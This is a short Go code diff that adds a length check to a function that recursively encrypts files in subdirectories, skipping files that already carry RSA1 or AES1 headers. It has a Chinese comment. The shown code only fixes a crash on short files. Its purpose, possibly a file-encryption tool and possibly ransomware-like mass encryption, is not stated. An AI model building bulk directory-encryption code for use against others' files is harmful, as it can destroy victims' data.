@@ -48,7 +48,8 @@ func encryptSubDirByBFS(dir string) {
 		_, docData := readFile(doc.path)
 
 		//如果文件已经被加密过了就不加密了
-		if bytes.Equal(docData[:17], RSA1_HEADER) || bytes.Equal(docData[:17], AES1_HEADER) {
+
+		if len(docData) > 17 && (bytes.Equal(docData[:17], RSA1_HEADER) || bytes.Equal(docData[:17], AES1_HEADER)) {
 			continue
 		}
 
